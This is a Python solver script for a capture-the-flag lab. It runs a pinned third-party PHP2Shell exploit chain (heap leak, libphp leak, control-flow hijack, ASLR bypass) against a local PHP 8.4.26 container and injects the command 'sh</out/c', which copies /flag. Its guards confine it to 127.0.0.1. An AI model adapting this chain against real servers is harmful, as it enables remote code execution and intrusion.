#!/usr/bin/env python3
"""Run the ASLR-bypass chain against this repository's local PHP2Shell lab only.

This solver intentionally has no target or command options.  It targets
127.0.0.1:8426, executes only the staged /flag proof command, and refuses to
run when host ASLR is disabled.
"""

from __future__ import annotations

import json
import re
import stat
import subprocess
import sys
import urllib.request
from pathlib import Path

from bootstrap_upstream import EXPECTED_COMMIT, prepare


TARGET_URL = "http://127.0.0.1:8426/index.php"
FINGERPRINT_URL = "http://127.0.0.1:8426/version.php"
CONTAINER = "php2shell-vulnerable"
TRIGGER = "sh</out/c"

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "runtime" / "out"
PROOF = OUT / "flag.txt"
STAGED_SCRIPT = OUT / "c"
VENDOR = Path(__file__).resolve().parent / "vendor" / "php2shell-upstream"
EXPLOIT = VENDOR / "exploit.py"
OFFSETS = VENDOR / "out" / "offsets.env"
VERIFY = ROOT / "scripts" / "verify_flag.sh"

EXPECTED_FINGERPRINT = {
    "PHP_VERSION": "8.4.26",
    "PHP_SAPI": "apache2handler",
    "MEMORY_LIMIT": "8M",
    "SESSION_UPLOAD_PROGRESS": "1",
    "ROLE": "vulnerable",
}


def fail(message: str) -> None:
    raise RuntimeError(message)


def check_aslr() -> None:
    try:
        value = int((Path("/proc/sys/kernel/randomize_va_space")).read_text().strip())
    except OSError as exc:
        fail(f"cannot read ASLR state: {exc}")
    if value != 2:
        fail(f"ASLR must remain fully enabled (randomize_va_space=2); current={value}")
    print("[+] host ASLR enabled: randomize_va_space=2")


def docker_inspect() -> dict:
    try:
        result = subprocess.run(
            ["docker", "inspect", CONTAINER],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
    except FileNotFoundError as exc:
        fail(
            "solve_local.py is organizer-only; players should use "
            "solver/solve_remote.py http://challenge-host:8426"
        )
    except subprocess.CalledProcessError as exc:
        fail(f"container {CONTAINER} is not available: {exc.stderr.strip()}")
    reports = json.loads(result.stdout)
    if not isinstance(reports, list) or len(reports) != 1:
        fail(f"unexpected docker inspect result for {CONTAINER}")
    return reports[0]


def check_container(report: dict) -> None:
    if not report.get("State", {}).get("Running"):
        fail(f"container {CONTAINER} is not running")

    labels = report.get("Config", {}).get("Labels") or {}
    if labels.get("php2shell.role") != "vulnerable":
        fail("target container is not the challenge's vulnerable role")
    if labels.get("php2shell.php-version") != "8.4.26":
        fail("target container is not the pinned PHP 8.4.26 build")

    mounts = report.get("Mounts") or []
    expected_source = str(OUT.resolve())
    if not any(
        mount.get("Destination") == "/out"
        and mount.get("Source", "").rstrip("/") == expected_source
        and mount.get("RW") is True
        for mount in mounts
    ):
        fail("the target does not have this repository's runtime/out directory mounted at /out")

    ports = report.get("NetworkSettings", {}).get("Ports") or {}
    bindings = ports.get("80/tcp") or []
    if not any(
        binding.get("HostIp") == "127.0.0.1" and str(binding.get("HostPort")) == "8426"
        for binding in bindings
    ):
        fail("target is not bound to 127.0.0.1:8426")
    print(f"[+] target container verified: {CONTAINER}")


def check_fingerprint() -> None:
    try:
        with urllib.request.urlopen(FINGERPRINT_URL, timeout=5) as response:
            body = response.read().decode("utf-8", "replace")
    except Exception as exc:
        fail(f"cannot fingerprint {FINGERPRINT_URL}: {exc}")

    observed = {}
    for line in body.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            observed[key] = value

    mismatches = {
        key: (EXPECTED_FINGERPRINT[key], observed.get(key))
        for key in EXPECTED_FINGERPRINT
        if observed.get(key) != EXPECTED_FINGERPRINT[key]
    }
    if mismatches:
        fail(f"target fingerprint mismatch: {mismatches}")
    print("[+] target fingerprint verified: PHP 8.4.26 / apache2handler / 8M")


def stage_fixed_proof_command() -> None:
    if OUT.is_symlink() or not OUT.is_dir():
        fail(f"proof directory is not a normal directory: {OUT}")

    for path in (PROOF, STAGED_SCRIPT):
        try:
            path.unlink()
        except FileNotFoundError:
            pass
        except OSError as exc:
            fail(f"cannot reset {path}: {exc}")

    STAGED_SCRIPT.write_text(
        "#!/bin/sh\n"
        "{\n"
        "  cat /flag > /out/flag.txt\n"
        "} > /out/solver.log 2>&1\n",
        encoding="utf-8",
    )
    STAGED_SCRIPT.chmod(0o755)
    mode = stat.S_IMODE(STAGED_SCRIPT.stat().st_mode)
    if mode != 0o755:
        fail("could not set fixed proof script permissions")
    print("[+] fixed proof command staged at /out/c")


def prepare_exploit() -> None:
    prepare(VENDOR)
    if current_commit_local() != EXPECTED_COMMIT:
        fail("pinned PHP2Shell upstream commit verification failed")
    if not EXPLOIT.is_file():
        fail(f"pinned exploit is missing: {EXPLOIT}")
    print(f"[+] ASLR research exploit pinned at {EXPECTED_COMMIT[:12]}")


def current_commit_local() -> str | None:
    try:
        result = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=VENDOR,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        return result.stdout.strip()
    except (OSError, subprocess.CalledProcessError):
        return None


def run_exploit() -> tuple[int, int]:
    command = [
        sys.executable,
        str(EXPLOIT),
        "-u", TARGET_URL,
        "-c", TRIGGER,
        "--profile", "bookworm",
        "--proof-file", str(PROOF),
        "--docker-container", CONTAINER,
        "--offsets-file", str(OFFSETS),
        "--retries", "3",
        "--timeout", "60",
    ]
    print("[*] starting heap leak -> libphp leak -> control-flow chain")

    process = subprocess.Popen(
        command,
        cwd=str(VENDOR),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    chunk_base = 0
    libphp_base = 0
    assert process.stdout is not None
    for line in process.stdout:
        if line.startswith("PROOF: "):
            print("PROOF: <received>")
        else:
            print(line, end="")
        match = re.search(r"chunk base = (0x[0-9a-fA-F]+)", line)
        if match:
            chunk_base = int(match.group(1), 16)
        match = re.search(r"libphp base = (0x[0-9a-fA-F]+)", line)
        if match:
            libphp_base = int(match.group(1), 16)

    returncode = process.wait()
    if returncode != 0:
        fail(f"exploit process exited with status {returncode}")
    if not chunk_base or not libphp_base:
        fail("exploit returned success but did not disclose both runtime bases")
    if chunk_base == libphp_base:
        fail("implausible identical heap and libphp bases")

    print(f"[+] Zend heap chunk base: 0x{chunk_base:x}")
    print(f"[+] libphp.so base:       0x{libphp_base:x}")
    print("[+] ASLR bypass completed using runtime-derived addresses")
    return chunk_base, libphp_base


def verify_proof() -> None:
    try:
        subprocess.run([str(VERIFY)], check=True)
    except FileNotFoundError as exc:
        fail(f"proof verifier not found: {exc}")
    except subprocess.CalledProcessError as exc:
        fail(f"proof verification failed with status {exc.returncode}")
    print("CHALLENGE_SOLVED=yes")
    print("ASLR_BYPASS=yes")


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)
    if any(arg not in ("-h", "--help") for arg in sys.argv[1:]):
        print("This solver has no options: it only targets the local lab.", file=sys.stderr)
        return 2

    check_aslr()
    report = docker_inspect()
    check_container(report)
    check_fingerprint()
    stage_fixed_proof_command()
    prepare_exploit()
    run_exploit()
    verify_proof()
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
    except RuntimeError as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        raise SystemExit(1)
